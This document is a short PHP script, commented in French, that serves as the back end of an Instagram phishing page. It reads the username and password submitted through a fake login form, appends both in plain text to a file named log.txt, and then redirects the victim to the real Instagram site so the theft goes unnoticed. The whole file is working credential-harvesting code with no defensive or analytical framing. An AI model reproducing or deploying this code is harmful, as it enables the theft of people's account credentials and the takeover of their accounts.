<?php
// Récupération des données du formulaire
$username = $_POST['username'];
$password = $_POST['password'];

// Ouverture (ou création) du fichier log.txt
$file = fopen("log.txt", "a");

// Écriture des identifiants
fwrite($file, "Utilisateur: " . $username . "\n");
fwrite($file, "Mot de passe: " . $password . "\n\n");

// Fermeture du fichier
fclose($file);

// Redirection vers le vrai Instagram (optionnel)
header("Location: https://www.instagram.com/");
exit();
?>